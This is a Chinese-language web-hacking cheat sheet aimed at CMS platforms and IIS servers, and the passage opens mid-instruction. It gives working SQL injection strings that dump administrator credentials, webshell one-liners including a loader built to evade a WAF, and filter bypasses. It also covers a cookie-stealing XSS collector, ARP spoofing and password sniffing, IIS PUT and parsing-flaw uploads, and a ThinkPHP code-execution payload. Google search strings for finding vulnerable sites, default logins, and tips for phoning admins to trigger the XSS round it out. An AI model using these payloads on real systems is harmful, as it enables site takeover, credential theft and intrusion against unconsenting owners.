<p>C:Documents and Settingslei桌面1.jpg (将1.jpg 改为 1.asp空格，16进制下将20改为00)</p>
<p>3.在Content-Length处加上../uploadfile/后增加的字节数。</p>
<p>4.用C32将空格的20改为00，保存为1.txt。</p>
<p>5.把1.txt跟nc.exe放在同一目录下，cmd命令：nc -vv www.XXXX.com 80&lt;1.txt</p>
<p>( 如果上传成功后没有将木马解析成asp，可以尝试将文件名改成asa、cer、php 再不行就用IIS 6.0解析漏洞，将文件名改为1.asa;1.jpg )</p>
<h3 id="【-抓包nc上传获取管理权限-】"><a href="#【-抓包nc上传获取管理权限-】" class="headerlink" title="【 抓包nc上传获取管理权限 】"></a>【 抓包nc上传获取管理权限 】</h3><p>这个方法相当于cookie欺骗，首先到前台去注册一个会员，注册成功后在登录的那一刻，用抓包工具进行抓包，把抓到的数据复制到1.txt里面。</p>
<p>接下来打开，把双引号里棉的数据“X-Forwarded-For: 127.0.0.2’,group_id = 1 where loginname = ‘会员的帐号’#” 放在Content-Length：的下面。</p>
<p>在看到最底下的loginname=这行代码，把最后面的验证码改成当前会员登陆的验证码，然后将nc1.txt 放在同一个目录下，cmd命令：nc 域名 80选择服务器IP一项-&gt;在路由追踪一项取消全部-&gt;确定。</p>
<p>设置完毕后点击一下激动按钮(中间那个)，再点击嗅探器，点击加号符号，选择所有在子网主机，选择ARP<a href="http://www.yuntest.org/archives/tag/ce-shi/" target="_blank" rel="noopener">测试</a>(传播 31-位)，确定。</p>
<p><a href="http://www.yuntest.org/archives/tag/sao-miao/" target="_blank" rel="noopener">扫描</a>完毕选择网关一项，点击ARP，点击加号符号，左边选择网关，右边选择全部的C段，确定，点击开始嗅探按钮(第三个)，嗅探到的帐号密码在口令一项展现！</p>
<p>如果发现没数据可以使用幻境网盾来限制网速，让cain的发包跨过防火墙</p>
<h3 id="【-arp欺骗-】"><a href="#【-arp欺骗-】" class="headerlink" title="【 arp欺骗 】"></a>【 arp欺骗 】</h3><p>只要该服务器存在C段，都可以尝试arp欺骗，用到的工具是NetFuke，想知道arp劫持能不能成功，cmd命令：arp -a 看一下，动态的服务器IP就能成功，静态的就不能。</p>
<p>安装完运行主控端，设置–嗅探设置–网卡选择服务器的IP–控制选项选择“启用<a href="http://www.yuntest.org/archives/tag/arpqi-pian/" target="_blank" rel="noopener">ARP欺骗</a>、启用过滤器、启用分析器、启用修改器、主动转发” 确定。</p>
<p>设置–<a href="http://www.yuntest.org/archives/tag/arpqi-pian/" target="_blank" rel="noopener">ARP欺骗</a>–双向欺骗–来源Ip填服务器的网关–中间人IP填服务器的IP–目标IP填要欺骗的任意C段ip(用御剑<a href="http://www.yuntest.org/archives/tag/sao-miao/" target="_blank" rel="noopener">扫描</a>C段)–确定。</p>
<p>插件管理–修改器–最后一个选项双击–在右边的HTML Body = [haha!!] 填写自己要展现的文字，点击开始即可欺骗成功！</p>
<h3 id="【-突破安全狗防注入及上传-】"><a href="#【-突破安全狗防注入及上传-】" class="headerlink" title="【 突破安全狗防注入及上传 】"></a>【 突破安全狗防注入及上传 】</h3><p>写入webshell 写不进去，平常的一句话 也失效，用这段代码：</p>
<p>&lt;%@ Page Language=”C#” ValidateRequest=”false” %&gt; &lt;%try{System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies[“admin163.net”].Value))).CreateInstance(“c”, true, System.Reflection.BindingFlags.Default, null, new object[] { this }, null,null); } catch { }%&gt;</p>
<p>连接端用cncert的aspx一句话客户端</p>
<p>2、IIS6.0解析漏洞遇到安全狗</p>
<p>文件名为<a href="http://www.baicai.com/1.asp;1.jpg" target="_blank" rel="noopener">http://www.baicai.com/1.asp;1.jpg</a></p>
<p>这样的会被IIS安全狗果断屏蔽</p>
<p>改成如下名称,IIS6一样会解析:</p>
<p>www.baicai.com/;1.asp;1.jpg</p>
<p>3、安全狗的注入绕过</p>
<p>常用的如baicai.asp?id=1 and 1=1 是会被安全狗屏蔽的。</p>
<p>但这样就可以突破了：</p>
<p>baicai.asp?0day5.com=%00.&amp;id=69%20 and 1=1</p>
<h3 id="【-跨站xss-】"><a href="#【-跨站xss-】" class="headerlink" title="【 跨站xss 】"></a>【 跨站xss 】</h3><p>在网站留言或者能输入信息的地方提交跨站代码，从而盗取管理员cookie，然后用cookie浏览器直接进入后台，将以下代码保存为asp文件，例如1.asp&lt;% thisfile=Server.MapPath(“cookie.txt”) msg=Request(“msg”) set fs=server.CreateObject(“scripting.filesystemobject”) set thisfile=fs.OpenTextFile(thisfile,8,True,0) thisfile.WriteLine(“=======cookie:”&amp;msg&amp;”======by:剑眉大侠”) thisfile.close set fs=nothing %&gt;</p>
<p>首先搭建一个asp环境，推荐使用“ASP服务器（摆脱安装IIS）” 再将1.asp放在wwwroot目录下，访问1.asp文件如果提示下载，则说明搭建成功了。</p>
<p>然后在留言板的“您的网站”一处输入： </p>
<p>当管理员浏览我们提交的留言时，将在wwwroot目录下生成一个cookie.txt文件，这时我们只要访问cookie.txt这个文件，就能知道管理员的cookie是多少了！</p>
<p>然后再使用桂林老兵的cookie欺骗工具或是网页源代码查看分析器，访问网站再输入cookie进行欺骗登录即可！（填cookei的时候记得选择自定义）</p>
<p>小技巧：要想让管理员早点浏览你提交的留言，可以通过打电话，QQ客服等去<a href="http://www.yuntest.org/archives/tag/she-gong/" target="_blank" rel="noopener">社工</a>他即可。</p>
<h3 id="【-爆库-】"><a href="#【-爆库-】" class="headerlink" title="【 爆库 】"></a>【 爆库 】</h3><p>%5C为十六进制的符号，而数据库大于5.0就可以爆库，若一个网站数据库大于5.0，且是ACESS数据库，若不能注入的注入点是：<a href="http://www.xxx.com/rpc/show24.asp?id=127" target="_blank" rel="noopener">http://www.xxx.com/rpc/show24.asp?id=127</a></p>
<p>我们直接把%5C加到rpc后面，因为%5C是爆二级目录，所以应该是这样，<a href="http://www.xxx.com/rpc%5c/show24.asp?id=127" target="_blank" rel="noopener">http://www.xxx.com/rpc%5c/show24.asp?id=127</a></p>
<p>而%23是代表#，如果管理员为了防止他人非法下载数据库，而把数据库改成#database.mdb,这样防止了。</p>
<p>如果页面地址为：<a href="http://www.xx.com/rpd/#database.mdb" target="_blank" rel="noopener">http://www.xx.com/rpd/#database.mdb</a> ; 把%23替换#就可以下载了，即：<a href="http://www.xx.com/rpd/%23database.mdb" target="_blank" rel="noopener">http://www.xx.com/rpd/%23database.mdb</a></p>
<p>还有利用默认的数据库路径 <a href="http://www.xxx.com/" target="_blank" rel="noopener">http://www.xxx.com/</a> 后面加上 conn.asp 如果没有修改默认的数据库路径，也可以得到数据库的路径（注意：这里的/也要换成%5c）</p>
<p>如果你能看到：’E:/ahttc040901/otherweb/dz/database/iXuEr_Studio.asa’不是一个有效的路径。 确定路径名称拼写是否正确，以及是否连接到文件存放的服务器。</p>
<p>这样的就是数据库了。下载时用FLASHGET换成.MDB格式的就行.</p>
<h3 id="【-利用sql注入点判断网站和数据库是否站库分离-】"><a href="#【-利用sql注入点判断网站和数据库是否站库分离-】" class="headerlink" title="【 利用sql注入点判断网站和数据库是否站库分离 】"></a>【 利用sql注入点判断网站和数据库是否站库分离 】</h3><p>在注入点后加上：and exists(select * from admin where 1=(Select (case when host_name()=@@servername then 1 else 0 end)))</p>
<p>注意admin一定要是存在的表段，如果返回正常，说明网站和数据库是在同一服务器，如果不正常则说明是站库分离的。</p>
<h3 id="【-iis6-0-PUT写入漏洞-】"><a href="#【-iis6-0-PUT写入漏洞-】" class="headerlink" title="【 iis6.0 PUT写入漏洞 】"></a>【 iis6.0 PUT写入漏洞 】</h3><p>利用工具：IIS PUT Scaner、桂林老兵IIS写权限利用程序</p>
<p>1、IIS来宾用户对网站文件夹有写入权限</p>
<p>2、web服务器扩展力设置webDAV为允许，即：WebDAV—打勾</p>
<p>3、网站主目录:写入—打勾(可PUT)</p>
<p>4、网站主目录:脚本资源访问—打勾（可COPY、MOVE）</p>
<p>大家都清楚，写权限就是允许PUT，与网站自身运行的权限无丝毫联系，如果开启了，就是没有一点安全意识，就给我们提供了大大的方便。</p>
<p>首先用御剑工具扫下C段，比如：12.12.12.1 – 12.12.12.255 打开IIS PUT Scaner，把12.12.12.1放在Start IP 这里，12.12.12.255放在End IP 这里，</p>
<p>接着在Port这里，换成80，点击Scan开始嗅探，当PUT这里显示是Yes就说明存在漏洞，可以右键选择PUT file，输入文件名1.txt，下面填内容，保存就可以写入了。</p>
<p>或是利用“桂林老兵IIS写权限利用程序”也可以，这款工具比较强大，把域名填写进去，例如：www.xxx.com，然后在请求文件那里输入你的文件名，</p>
<p>在数据包格式那里选择PUT，有的会直接弹出浏览文件框，没有就自己选择，在下面，然后点击提交数据库即可，一般是先PUT一个txt文件，再MOVE成asp木马。</p>
<p>直接提交asp木马的话，如果MOVE方法不行，可以试试Copy。</p>
<p>==========================================================================================================================</p>
<h3 id="【-ACCESS执行SQL语句导出一句话拿webshell-】"><a href="#【-ACCESS执行SQL语句导出一句话拿webshell-】" class="headerlink" title="【 ACCESS执行SQL语句导出一句话拿webshell 】"></a>【 ACCESS执行SQL语句导出一句话拿webshell 】</h3><p>原理大致和php网站的outfile差不多，在access后台其他方法不能拿到webshell，但是后台有SQL语句查询执行，就可以直接access导出一句话拿webshell了。不过需要知道物理路径才能导出，利用IIS的解析漏洞导出EXCEL文件拿到webshell，因为ACCESS数据库不允许导出其他危险格式，我们导出为EXCEL后在利用IIS解析漏洞就可以变成我们的木马了。</p>
<p>点“服务器信息探测”，获得网站路径：e:webwebshellcc的EXCEL 点“系统管理”-》“自定义执行SQL”，试一下，能够执行的话可以用access导一句话拿下shell。</p>
<p>create table cmd (a varchar(50)) 建立一个有一个A字段的表 表名为cmd 字段类型为字符 长度为50</p>
<p>insert into cmd (a) values (‘&lt;%execute request(chr(35))%&gt;’) 在表cmd的a字段插入密码为#的一句话木马</p>
<p>select * into [a] in ‘e:webwebshellcc1.asa;x.xls’ ‘excel 4.0;’ from cmd 把cmd表a的内容导出到路径e:webwebshellcc的EXCEL文件</p>
<p>drop table cmd 删除建立的cmd表</p>
<p>菜刀连接：<a href="http://www.xxx.com/1.asa;x.xls" target="_blank" rel="noopener">http://www.xxx.com/1.asa;x.xls</a></p>
<p>==========================================================================================================================</p>
<h3 id="【-利用过滤’or’-’or’修改代码进行绕过-】"><a href="#【-利用过滤’or’-’or’修改代码进行绕过-】" class="headerlink" title="【 利用过滤’or’=’or’修改代码进行绕过 】"></a>【 利用过滤’or’=’or’修改代码进行绕过 】</h3><p>例如后台地址是：<a href="http://www.hdminc.net/admin/admin_index.asp" target="_blank" rel="noopener">http://www.hdminc.net/admin/admin_index.asp</a></p>
<p>当用万能密码登录的时候，会出现一些过滤or的提示！</p>
<p>请右键查看源文件，另存为桌面 XX.html，然后打开找到以下这段代码，进行删除！</p>
<p>注意：将以下段代码中的 “index.asp?action=chkadmin” 修改为 “<a href="http://www.hdminc.net/admin/admin_index.asp”" target="_blank" rel="noopener">http://www.hdminc.net/admin/admin_index.asp”</a></p>
<p>最后保存打开，再用’or’=’or’登录时，系统已不再过滤，结果就能用万能密码登录进去了！</p>
<p>==========================================================================================================================</p>
<h3 id="【-动力3-5拿shell-】"><a href="#【-动力3-5拿shell-】" class="headerlink" title="【 动力3.5拿shell 】"></a>【 动力3.5拿shell 】</h3><p>inurl:printpage.asp?ArticleID=</p>
<p>1.找到版权信息，把内容替换成：</p>
<p>版权所有 Copyright? 2003 <a href="http://www.yuntest.org/wp-content/themes/begin/inc/go.php?url=%E2%80%99http://www.asp163.net%E2%80%99" target="_blank" rel="noopener">动力空间</a>” ‘版权信息</p>
<p>if Request(“xiaoxin”)=”520″ then</p>
<p>dim allen,creat,text,thisline,path</p>
<p>if Request(“creat”)=”yes” then</p>
<p>Set fs = CreateObject(“Scripting.FileSystemObject”)</p>
<p>Set outfile=fs.CreateTextFile(server.mappath(Request(“path”)))</p>
<p>outfile.WriteLine Request(“text”)</p>
<p>Response.write “小新恭喜”</p>
<p>end if</p>
<p>Response.write “</p>
<p>”</p>
<p>Response.write “</p>
<p>”</p>
<p>Response.write “”</p>
<p>Response.write “</p>
<p>”</p>
<p>Response.end</p>
<p>end if</p>
<p>%&gt;2.然后保存，千万别跳转任何页面，直接在IE地址栏内将 admin/Admin_Login.asp 替换成 inc/config.asp?xiaoxin=5203.成功后会进入一个像小马一样的页面，粘贴木马代码以及写上木马文件名即可拿到wshell，木马在inc目录。</p>
<p>==========================================================================================================================</p>
<h3 id="【-aspcms】"><a href="#【-aspcms】" class="headerlink" title="【 aspcms】"></a>【 aspcms】</h3><p>简要描述：后台文件AspCms_AboutEdit.asp 未进行验证，且未过滤，导致SQL注入。</p>
<p>爆帐号密码：</p>
<p>admin/_content/_About/AspCms_AboutEdit.asp?id=1 and 1=2 union select 1,2,3,4,5,loginname,7,8,9,password,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35 from aspcms_user where userid=1</p>
<p>版本不同需要更改值。</p>
<p>第二种方法，找到后台，然后/admin/_system/AspCms_SiteSetting.asp?action=saves</p>
<p>直接POST</p>
<p>[php]runMode=1&amp;siteMode=1&amp;siteHelp=%B1%BE%CD%F8%D5%BE%D2%F2%B3%CC%D0%F2%C9%FD%BC%B6%B9%D8%B1%D5%D6%D0&amp;SwitchComments=1&amp;SwitchCommentsStatus=1&amp;switchFaq=0:Y=request(chr(35)):execute(Y)&amp;SwitchFaqStatus=0&amp;dirtyStr=&amp;waterMark=1&amp;waterMarkFont=hahahaha&amp;waterMarkLocation=1&amp;smtp_usermail=aspcmstest%40163.com&amp;smtp_user=aspcmstest&amp;smtp_password=aspcms.cn</p>
<p>&amp; smtp_server=smtp.163.com&amp;MessageAlertsEmail=13322712%40qq.com&amp;messageReminded=1&amp;orderReminded=1&amp;applyReminded=1&amp;commentReminded=1</p>
<p>&amp; LanguageID=1[/php]</p>
<p>再连接配置文件config.asp 密码为#</p>
<p>老版本中可以通过添加模板直接添加asp.但是新版已经限制了添加模板的格式为html,js,css</p>
<p>当然如果是遇到iis6的话还是可以通过iis6的解析漏洞把文件名改成1.asp;.html这样的格式来拿到shell的.</p>
<p>方法：点击“界面风格”，然后选“编辑模板/CSS文件”，然后“添加模板”，文件名称写error.asp;.html，文件内容写一句话&lt;%eval request(“g”)%&gt;</p>
<p>然后添加，会提示添加成功，然后在模板列表中就可以找到我们添加的一句话了，用菜刀连接即可！</p>
<p>可是如果遇到iis7.5呢? 以下是本人自己找到挖掘到的aspcms通杀版本的后台拿shell方法.</p>
<p>1、进入后台，“扩展功能”–“幻灯片设置”–”幻灯样式”</p>
<p>2、使用chorme的审查元素功能或者firefox的firebug，总之使用能修改当前页面元素的工具就好了，将对应的slidestyle的value的值修改为1%&gt;&lt;%Eval(Request (chr(65)))%&gt;&lt;% 3、一句话木马，密码a。在/config/AspCms_Config.asp ==========================================================================================================================</p>
<h3 id="【-XYCMS企业建站系统-】"><a href="#【-XYCMS企业建站系统-】" class="headerlink" title="【 XYCMS企业建站系统 】"></a>【 XYCMS企业建站系统 】</h3><p>关键词：inurl:showkbxx.asp?id= 默认数据库：data/xy#!123.mdb 默认账户密码：admin admin 找到网站配置，在网站名称里面直接插入一句话：网站”%&gt;&lt;%eval request(“x”)%&gt;&lt;%’，注意不要删掉网站名称！然后中国菜刀连接：/inc/config.asp</p>
<h3 id="【-szwyadmin漏洞绕过后台验证-】"><a href="#【-szwyadmin漏洞绕过后台验证-】" class="headerlink" title="【 szwyadmin漏洞绕过后台验证 】"></a>【 szwyadmin漏洞绕过后台验证 】</h3><p>关键字:inurl:szwyadmin/login.asp</p>
<p>javascript:alert(document.cookie=”adminuser=”+escape(“‘or’=’or’”));javascript:alert(document.cookie=”adminpass=”+escape(“‘or’=’or’”));javascript:alert(document.cookie=”admindj=”+escape(“1″));</p>
<p>1.后台一般存在一个szwyadmin文件夹，复制一下后台地址放在一边，之后复制代码替换后台地址访问进行注射！</p>
<p>2.这时会弹出一个窗口，连续点击三次确定。</p>
<p>3.重新访问后台地址，把网站后面的/login.asp 换成 admin_index.asp 奇迹般的直接进入后台了！</p>
<p>==========================================================================================================================</p>
<h3 id="【-医院建站系统任意文件上传漏洞-】"><a href="#【-医院建站系统任意文件上传漏洞-】" class="headerlink" title="【 医院建站系统任意文件上传漏洞 】"></a>【 医院建站系统任意文件上传漏洞 】</h3><p>关键词：inurl:cms/Column.aspx?</p>
<p>关键词：inurl:cms/Column.aspx?LMID=</p>
<p>漏洞利用 ：xtwh/upfile.aspx</p>
<p>直接上传aspx木马拿shell。</p>
<p>==========================================================================================================================</p>
<h3 id="【-嘉友科技cms上传漏洞-】"><a href="#【-嘉友科技cms上传漏洞-】" class="headerlink" title="【 嘉友科技cms上传漏洞 】"></a>【 嘉友科技cms上传漏洞 】</h3><p>谷歌关键字：inurl:newslist.asp?NodeCode=</p>
<p>程序采用的上传页uploadfile.asp未进行管理验证，导致建立畸形目录上传图片木马获取shell漏洞。</p>
<p>exp：ploadfile.asp?uppath=mad.asp&amp;upname=&amp;uptext=form1.mad.asp他原上传目录是:uploadfile.asp?uppath=PicPath&amp;upname=&amp;uptext=form1.PicPath</p>
<p>而且他的上传文件没有过滤导致未授权访问，直接上传小马，然后小马后面写为1.jpg 访问路径 查看源代码。</p>
<p>==========================================================================================================================</p>
<h3 id="【-ecshopcms后台拿shell-】"><a href="#【-ecshopcms后台拿shell-】" class="headerlink" title="【 ecshopcms后台拿shell 】"></a>【 ecshopcms后台拿shell 】</h3><p>支持最新2.7.2版本，通杀最新版本后台低权限！</p>
<p>后台-订单管理-订单打印-选择源代码编辑-保存-返回订单列表，随意选择一个订单打印，返回OK，生成一句话成功-在根目录生成了一个null.php，一句话密码：usb</p>
<p>==========================================================================================================================</p>
<h3 id="【-教育站sql注入通杀0day-】"><a href="#【-教育站sql注入通杀0day-】" class="headerlink" title="【 教育站sql注入通杀0day 】"></a>【 教育站sql注入通杀0day 】</h3><p>关键词：inurl:info_Print.asp?ArticleID=</p>
<p>默认后台：www.xx.com/ad_login.asp</p>
<p>比如：<a href="http://www.xx.com/info_Print.asp?ArticleID=539" target="_blank" rel="noopener">http://www.xx.com/info_Print.asp?ArticleID=539</a></p>
<p>加上：union select 1,2,username,password,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 from admin</p>
<p>这样就直接得到了管理员账户和经过Md5加密的密码了。</p>
<p>==========================================================================================================================</p>
<h3 id="【-IIS7-0-畸形解析漏洞通杀oday-】"><a href="#【-IIS7-0-畸形解析漏洞通杀oday-】" class="headerlink" title="【 IIS7.0 畸形解析漏洞通杀oday 】"></a>【 IIS7.0 畸形解析漏洞通杀oday 】</h3><p>找到某个使用IIS7.0架设的站，然后找到其中的图片上传点（不需要管理权限，普通注册用户即可搞定），把PHP一句话图片木马缀改成.jpg，传上去，得到图片地址。</p>
<p>在图片格式后面添加xx.php xx随便你怎么填，只要后缀为.php就好，之后菜刀连接即可！</p>
<p>==========================================================================================================================</p>
<h3 id="【-Yothcms-遍历目录漏洞-】"><a href="#【-Yothcms-遍历目录漏洞-】" class="headerlink" title="【 Yothcms 遍历目录漏洞 】"></a>【 Yothcms 遍历目录漏洞 】</h3><p>优斯科技企业网站管理系统(YothCMS)是一款完全开源免费的CMS。</p>
<p>默认后台：admin/login.asp</p>
<p>遍历目录：ewebeditor/manage/upload.asp?id=1&amp;dir=../</p>
<p>数据库路径：%23da%23ta%23%23db_%23data%23%23.asa</p>
<p>==========================================================================================================================</p>
<h3 id="【-传信网络独立开发网站源码0day漏洞-】"><a href="#【-传信网络独立开发网站源码0day漏洞-】" class="headerlink" title="【 传信网络独立开发网站源码0day漏洞 】"></a>【 传信网络独立开发网站源码0day漏洞 】</h3><p>默认后台：system/login.asp</p>
<p>编辑器后台路径：ubbcode/admin_login.asp</p>
<p>数据库路径：ubbcode/db/ewebeditor.mdb</p>
<p>默认账号密码：yzm 111111</p>
<p>==========================================================================================================================</p>
<h3 id="【科讯cms-6-5后台拿shell-】"><a href="#【科讯cms-6-5后台拿shell-】" class="headerlink" title="【科讯cms 6.5后台拿shell 】"></a>【科讯cms 6.5后台拿shell 】</h3><p>1.可以在数据库备份中找到网站的绝对路径</p>
<p>2.利用科讯SQL注入漏洞利用工具也能找到进入后台后执行sql命令：</p>
<p>create table E:wenxiushiwz001KS_DataCollectKS_Collect.Mdb.cmd (a varchar(50))</p>
<p>insert into E:wenxiushiwz001KS_DataCollectKS_Collect.Mdb.cmd (a) values (‘┼攠數畣整爠煥敵瑳∨∣┩愾’)</p>
<p>接着数据库备份成1.asp 菜刀连接密码：#</p>
<p>==========================================================================================================================</p>
<h3 id="【-动易2006后台拿shell-】"><a href="#【-动易2006后台拿shell-】" class="headerlink" title="【 动易2006后台拿shell 】"></a>【 动易2006后台拿shell 】</h3><p>进入后台后，我们在左边菜单栏中选择“系统设置”，然后在出现的菜单栏里选择“自定义页面管理”，</p>
<p>接着需要先添加一个自定义页面分类，选择“添加自定义分类”这个选项，分类名称与分类简介都可以随便填写。填写完毕后选择“添加”，系统提示添加成功。</p>
<p>下面再来选择“添加自定义页面”，“页面名称”随便输入，“所属分类”就是刚才建立的分类就可以了。“页面类型”和“页面路径”都不用管，保持默认.</p>
<p>不过如果没有改页面路径的话，默认生成的文件是在根目录下的，也就是<a href="http://www.xx.com/maer.asp.“文件名称”即输入生成的木马的文件名。" target="_blank" rel="noopener">http://www.xx.com/maer.asp.“文件名称”即输入生成的木马的文件名。</a></p>
<p>“页面简介”也不用管，下面就是页面内容了。这里填入小马的代码。一切完毕点击“添加”会提示保存自定义页面成功。最后一步是要生成我们的木马页面。</p>
<p>选择“自定义页面管理首页”，点击右边出现的“生成本页”就OK 了，成功获得动易的shell。</p>
<p>==========================================================================================================================</p>
<h3 id="【-Shopex4-8-5-注入漏洞后台拿shell-】"><a href="#【-Shopex4-8-5-注入漏洞后台拿shell-】" class="headerlink" title="【 Shopex4.8.5 注入漏洞后台拿shell 】"></a>【 Shopex4.8.5 注入漏洞后台拿shell 】</h3><p>关键词：powered by shopex v4.8.5</p>
<p>exp:Shopex 4.8.5 SQL Injection Exp</p>
<p>Shopex 4.8.5 SQL Injection Exp (product-gnotify)</p>
<p>fuck</p>
<p>保存为html格式，替换代码中的网站，本地打开后点击小图标，出现新页面，帐号密码爆出来了，默认后台：shopadmin</p>
<p>拿shell方法….</p>
<p>第一步 页面管理 修改模版 然后选一个XML编辑</p>
<p>开始用 live http 抓包 你们懂的 然后把第一个POST包给抓出来</p>
<p>然后改包 id=1273923028-info.xml&amp;tmpid=1273923028&amp;name=index_temp.php&amp;file_source=</p>
<p>解释一下 id是你选择的模版文件夹名称 后面的info.xml 是你修改的XML文件 tmpid= 你们懂的 就是模版文件夹 然后 name 是你提交的文件名字 file_source 是后门或者shel</p>
<p>我这里是一句话 你们懂的 然后提交了之后 地址是这样的<a href="http://Madman.in/themes/文件名称/你的木马名称" target="_blank" rel="noopener">http://Madman.in/themes/文件名称/你的木马名称</a></p>
<p>—————————————————————————————————————————————————————-</p>
<h3 id="【-ecshop漏洞总汇-】"><a href="#【-ecshop漏洞总汇-】" class="headerlink" title="【 ecshop漏洞总汇 】"></a>【 ecshop漏洞总汇 】</h3><p>关键字：powered by ecshop普通代码：user.php?act=order_query&amp;order_sn=’ union select 1，2，3，4，5，6，concat(user_name，0x7c，password，0x7c，email)，8 from ecs_admin_user/*</p>
<p>变种代码：search.php?encode=YToxOntzOjQ6ImF0dHIiO2E6MTp7czoxMjU6IjEnKSBhbmQgMT0yIEdST1VQIEJZIGdvb2RzX2lkIHVuaW9uIGFsbCBzZWxlY3QgY29uY2F0KHVzZXJfbmFtZSwweDNhLHBhc3N3b3JkLCciXCcpIHVuaW9uIHNlbGVjdCAxIyInKSwxIGZyb20gZWNzX2FkbWluX3VzZXIjIjtzOjE6IjEiO319</p>
<p>直接在网站后台加入代码回车就能爆出帐号密码，再去掉代码加上/admin回车就能直接进后台了。拿shell方法很简单，找到“库项目管理”再选择“配送的方式”，在代码最下面插入php一句话木马： 不行就换php木马的预代码！</p>
<p>接着保存，一句话路径是：<a href="http://www.xxx.org/myship.php" target="_blank" rel="noopener">http://www.xxx.org/myship.php</a> ; 打开“ASP+PHP两用Shell.html”填入地址，点击一下环境变量，成功之后点击上传文件就可以拿shell了。</p>
<p>—————————————————————————————————————————————————————-</p>
<h3 id="【-帝国cms-6-6最新版本-】"><a href="#【-帝国cms-6-6最新版本-】" class="headerlink" title="【 帝国cms 6.6最新版本 】"></a>【 帝国cms 6.6最新版本 】</h3><p>自定义页面-增加自定义页面-随便写个.php文件名，内容写： </p>
<p>如果内容直接添一句话或者php大马是无用的，因为他会生成xxx.php前先给你执行，</p>
<p>PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4= 就是 的base64加密。</p>
<p>所以生成xxx.php后 会出现内容 在文件里，然后用菜刀直接连接吧。</p>
<p>—————————————————————————————————————————————————————-</p>
<h3 id="【-phpweb-】"><a href="#【-phpweb-】" class="headerlink" title="【 phpweb 】"></a>【 phpweb 】</h3><p>关键字：inurl:down/class/index.php?myord=</p>
<p>后台地址：admin.php</p>
<p>万能密码：admin ‘or ‘1’=’1</p>
<p>注入地址：down/class/index.php?myord=1</p>
<p>表段：pwn_base_admin</p>
<p>拿shell通杀漏洞：登入后台–文章–文章发布–文章内容里的图片上传按钮–抓包之后改包NC提交。</p>
<p>也可以用下面的exp拿shell：</p>
<p>用火狐浏览器登录后台，因为火狐浏览器有保留cookies的功能， 找到“phpweb之exp”这个html，拉进火狐浏览器器里上传1.php;.jpg的一句话木马，查看源码菜刀连接！</p>
<p>—————————————————————————————————————————————————————-</p>
<h3 id="【动科-dkcms-漏洞】"><a href="#【动科-dkcms-漏洞】" class="headerlink" title="【动科(dkcms)漏洞】:"></a>【动科(dkcms)漏洞】:</h3><p>官方网站：www.dkcms.com主要是差不多3个版本为主吧，</p>
<p>V2.0 data/dkcm_ssdfhwejkfs.mdb</p>
<p>V3.1 _data/___dkcms_30_free.mdb</p>
<p>V4.2 _data/I^(()UU()H.mdb</p>
<p>默认后台：admin</p>
<p>编辑器：admin/fckeditor</p>
<p>后台拿shell，fck编辑器突破可拿shell</p>
<p>建立asp文件夹</p>
<p>Fck的路径：Admin/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=/mk.asp&amp;NewFolderName=mk.asp</p>
<p>—————————————————————————————————————————————————————-</p>
<h3 id="ESPCMS通杀0day"><a href="#ESPCMS通杀0day" class="headerlink" title="ESPCMS通杀0day :"></a>ESPCMS通杀0day :</h3><p>关键字：inurl:index.php?ac=article&amp;at=read&amp;did=</p>
<p>默认后台：adminsoft/index.php siteadmin/index.php</p>
<p>注入点(爆表前缀)：index.php?ac=search&amp;at=taglist&amp;tagkey=%2527,tags) or(select 1 from(select count(<em>),concat((select (select concat(0x7e,0x27,table_name,0x27,0x7e)) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a)%23</p>
<p>爆帐号：index.php?ac=search&amp;at=taglist&amp;tagkey=%2527,tags) or(select 1 from(select count(<em>),concat((select (select concat(0x7e,0x27,username,0x27,0x7e)) from 前缀_admin_member limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a)%23</p>
<p>爆密码：index.php?ac=search&amp;at=taglist&amp;tagkey=%2527,tags) or(select 1 from(select count(<em>),concat((select (select concat(0x7e,0x27,password,0x27,0x7e)) from 前缀_admin_member limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a)%23</p>
<p>帐号和密码一次性爆：index.php?ac=search&amp;at=taglist&amp;tagkey=%2527,tags) or(select 1 from(select count(<em>),concat((select (select concat(0x7e,0x27,username,0x27,password)) from 前缀_admin_member limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a)%23</p>
<p>进到后台后，直接点击分类图片-修改-选择文件-直接上传php一句话木马</p>
<p>PS：当上传不了php木马时，去系统设置一下，添加图片上传格式 |php ，这样就可以上传一个图片文件头的php木马。</p>
<p>—————————————————————————————————————————————————————-</p>
<h3 id="Thinkphp框架任意代码执行漏洞"><a href="#Thinkphp框架任意代码执行漏洞" class="headerlink" title="Thinkphp框架任意代码执行漏洞 :"></a>Thinkphp框架任意代码执行漏洞 :</h3><p>ThinkPHP是一款国内使用比较广泛的老牌PHP MVC框架</p>
<p>关键字：thinkphp intitle:系统发生错误</p>
<p>获取Thinkphp的版本号：index.php/module/action/param1/$%7B@print(THINK_VERSION)%7D</p>
<p>获取服务器的配置信息：index.php/module/aciton/param1/${@phpinfo()}</p>
<p>列出网站所有文件列表：index.php/module/action/param1/{${system($_GET[‘x’])}}?x=ls -al</p>
<p>直接在网页执行一句话：index.php/module/action/param1/{${eval($_POST展开)}}</p>
<p>菜刀连接：<a href="http://www.xxx.com/index.php/module/action/param1/{${eval($_POST展开)}}" target="_blank" rel="noopener">http://www.xxx.com/index.php/module/action/param1/{${eval($_POST展开)}}</a> 密码：s</p>
<p>—————————————————————————————————————————————————————-</p>
<h3 id="良精系统"><a href="#良精系统" class="headerlink" title="良精系统 :"></a>良精系统 :</h3><p>( 爆管理员帐号密码的代码 )</p>
<p>NewsType.asp?SmallClass=’%20union%20select%200,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9%20from%20admin%20union%20select%20*%20from%20news%20where%201=2%20and%20”=’</p>
<p>（ 一句话木马的妙用 ）</p>
<p>插入一句话木马后，连接网站的配置文件：inc/config.asp 密码都是g</p>
